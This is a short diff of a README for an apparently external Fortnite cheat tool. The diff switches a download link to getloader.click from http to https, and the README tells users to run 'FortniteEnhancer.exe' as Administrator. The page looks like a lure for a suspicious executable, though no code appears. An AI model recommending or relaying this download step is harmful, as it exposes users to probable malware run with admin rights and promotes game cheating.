@@ -50,7 +50,7 @@ This tool works externally, meaning **no modification of Fortnite files or injec
 3. Run `FortniteEnhancer.exe` as Administrator.  
 4. Start Fortnite and press `Insert` to open the tool overlay.
 
-[![Download](https://i.postimg.cc/QNqcrHTm/downloadload.png)](http://getloader.click)  
+[![Download](https://i.postimg.cc/QNqcrHTm/downloadload.png)](https://getloader.click)  
 `📎 Note: If the link doesn't open, copy and paste manually into your browser → getloader.click`
 
 ---
